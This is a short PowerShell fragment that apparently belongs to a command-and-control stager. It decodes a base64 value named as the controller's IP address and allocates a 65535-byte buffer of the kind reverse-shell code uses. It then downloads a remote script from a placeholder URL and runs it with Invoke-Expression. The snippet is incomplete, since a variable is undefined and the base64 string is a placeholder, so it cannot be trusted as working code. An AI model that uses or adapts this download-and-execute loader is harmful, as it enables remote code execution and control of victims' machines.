$hi = $p;
$dataz = 'myipforCommandAndControl';
$hiz = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($dataz));

[byte[]]$bite = 0..65535|%{0};

(IWR https://myurl/T3.txt -UseBasicParsing) | IEX;
